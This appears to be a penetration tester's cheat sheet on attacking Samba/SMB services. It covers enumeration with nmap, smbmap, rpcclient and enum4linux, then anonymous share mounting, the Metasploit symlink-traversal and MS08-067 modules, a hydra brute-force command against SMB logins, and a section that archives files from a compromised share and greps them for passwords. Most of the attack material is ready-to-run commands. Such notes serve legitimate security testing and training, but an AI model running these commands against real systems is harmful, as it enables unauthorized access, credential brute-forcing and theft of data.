# ------------------------------- start enumeration ------------------------------- # 
    ==> Quick view: a linux-based implementation of the SMB/CIFS protocol, provides print
    and file sharing services for windows clients within an environment.
    based on the configuration, we can obtain OS version, user accounts on the system, file shares,
    thoer permissions and sensistive data and intergration active directory, enumerate much more
    information.
    smaba can be found listening on the usual NetBIOS port:
        137/tcp                 # NetBIOS name service
        137/udp
        138/tcp                 # NetBIOS Datagram service
        138/udp
        139/tcp                 # NetBIOS session service
        139/udp 
        445/tcp                 # Microsoft Naked CIFS

    # ---------- start enumerate shares ---------- #
        # ---------- |nmap| ---------- #
            nmap -sT -sU -sV <ip_address> -p,135,137,138,139,445 --open
            ==> explanation:
            # scan port and banner grabbing
            
            nmap --script smb-enum-shares <ip_address>
            ==> explanation: # retreive samba version and OS, share, anonymous/Guest access is allowed, access rights for shares.
            
            nmap --smb-os-discovery <ip_address> -p445
                ==> explanation: discover smb version.
       
        # ---------- |smbmap| ---------- #
            ==> Quick view: many options available with smbmap, includeing interacting with the remote file system,
            searching file contents for specific strings, and executing commands.

            smbmap -H <ip_address>
            ==> explanation: # retrieve shares, permissions.

        # ---------- |smbclient| ---------- #
            smbclient -L <ip_address>
            ==> explanation: # retreive share, samba version.
    # ----------   end enumerate shares ---------- #
    
    # ---------- start enumerate users ---------- #
        # ---------- |bash script| ---------- #
            for u in $(cat <user_list>);
                do rpcclient -U "" <ip_address> -N --command="lookupnames $u";
            done | grep "User: 1"

        # ---------- |rpcclient| ---------- #
            ==> Quick view: automated can be accomplished manually through rpcclient.
            some useful rpcclient commands include:
                - lookupsids
                - netshareenum
                - srvinfo
                - enumprivs
                - enumdomusers

            1st: rpcclient -U "" <ip_address> -N
            2nd: lookupnames <username>
    # ----------   end enumerate users ---------- #
    
    # ---------- start automate enumeration ---------- #
        # ---------- |enum4linux| ---------- #
            ==> Quick View: it can be used to enumerate the following:
                - OS
                - users
                - password policies
                - group memberships
                - shares
                - domain/workgroup identification

            enum4linux <ip_address>
    # ----------   end automate enumeration ---------- #
# -------------------------------   end enumeration ------------------------------- # 

# ------------------------------- start exploit through mount ------------------------------- # 
    # ---------- |smbclient| ---------- #
        1st: smbclient \\\\<ip_address>\\<path>
        2nd: blank password
    
    # ---------- |mount| ---------- #
        mount -t cifs \\\\<ip_address>\\<path> <local_path>
        ==> Note: cifs-utils package is required in this case.
# -------------------------------   end exploit through mount ------------------------------- # 

# ------------------------------- start exploit through samba Symlink Directory Traversal ------------------------------- # 
    ==> Quick View: result of misconfiguration in samba, essentially allows an attacker to craete a symbolic link to the root
    (/) partation from a writable share ultimately allowing for read access to the entire file system outside of the
    share directory.

    exploit tool: - metasploit: samba_symlink_traversal
                  - smbclient

    # ---------- |metasploit: samba_symlink_traversal| ---------- #
        use auxiliary/admin/smb/samba_symlink_traversal
        show options
        RHOST   <target_ip>
        RPORT   <target_port>
        SMBSHARE <the_name_of_a_writeable_share_on_the_server>
        SMBTARGET <the_name_of_the_directory_that_should_point_to_the_root_filesystem>
# -------------------------------   end exploit through samba Symlink Directory Traversal ------------------------------- # 

# ------------------------------- start smb crednetials bruteforce attack ------------------------------- # 
    # ---------- |Tools| ---------- #
        - hydra

    # ---------- |hydra| ---------- #
         hydra -L users.txt -P /usr/share/john/password.lst <target_ip> smb -f -V
# -------------------------------   end smb crednetials bruteforce attack ------------------------------- # 

# ------------------------------- start data exfiltration ------------------------------- # 
    # ---------- |tar| ---------- #
        smb: \rootfs\tmp\rootfs\> cd etc
        smb: \rootfs\tmp\rootfs\> tar c ../tmp/all_files.tar *      # compress all files inside tmp
        root@tester:/tmp# ls -als all_files.tar                     # the file translated to attacker machine as shown.
        root@tester:/tmp# tar xf /tmp/all_files.tar                 # the file translated to attacker machine as shown.
        root@tester:/tmp# grep -r "password" * 2>&1 /dev/null       # the file translated to attacker machine as shown.
# -------------------------------   end data exfiltration ------------------------------- # 




# ------------------------------- start CVE ------------------------------- # 
    # ---------- |CVE-2017-7494| ---------- #
        ==> Quick View: remote code execution vulnerability
            Summary: allowing a malicious client to upload a shared library to a writable share, and then 
                     cause the server to load and execute it.
            Versions: cpe:2.3:a:samba:samba:3.5.0:*:*:*:*:*:*:*
                      cpe:2.3:a:samba:samba:3.5.1:*:*:*:*:*:*:*
                      cpe:2.3:a:samba:samba:3.5.2:*:*:*:*:*:*:*
                      cpe:2.3:a:samba:samba:3.5.3:*:*:*:*:*:*:*
                      cpe:2.3:a:samba:samba:3.5.4:*:*:*:*:*:*:*
            resource: http://cve.circl.lu/cve/CVE-2017-7494


    # ---------- |CVE-2017-0144| ---------- #
        ==> Quick View: The SMBv1 server in Microsoft Windows Vista SP2; Windows Server 2008 SP2 and R2 SP1; 
        Windows 7 SP1; Windows 8.1; Windows Server 2012 Gold and R2; Windows RT 8.1; and Windows 10 Gold, 1511, and 1607; 
        and Windows Server 2016 allows remote attackers to execute arbitrary code via crafted packets, aka "Windows SMB Remote 
        Code Execution Vulnerability." This vulnerability is different from those described in CVE-2017-0143, CVE-2017-0145, 
        CVE-2017-0146, and CVE-2017-0148.

    # ---------- |CVE-2008-4250| ---------- #
        ==> Quick View: The vulnerability could allow remote code execution if an affected system received a specially crafted RPC request. 
        On Microsoft Windows 2000, Windows XP, and Windows Server 2003 systems, an attacker could exploit this vulnerability without 
        authentication to run arbitrary code. 

        # ---------- |Tools| ---------- #
            - metasploit: exploit/windows/smb/ms08_067_netapi

        # ---------- |metasploit: exploit/windows/smb/ms08_067_netapi| ---------- #
            use exploit/windows/smb/ms08_067_netapi
            show targets
            set targets <target_id>
            set payload <payload>
            show options
            set <options>
            exploit

    # ---------- |CVE-2007-2447| ---------- #
        ==> Quick View: Remote Command Injection Vulnerability
            Versions: Samba 3.0.0 - 3.0.25rc3 (inclusive)
            Summary: Unescaped user input parameters are passed 
                        as arguments to /bin/sh allowing for remote
                        command execution.
            resource: https://www.samba.org/samba/security/CVE-2007-2447.html
            
            exploit tool: metasploit: usermap_script
# -------------------------------   end CVE ------------------------------- # 

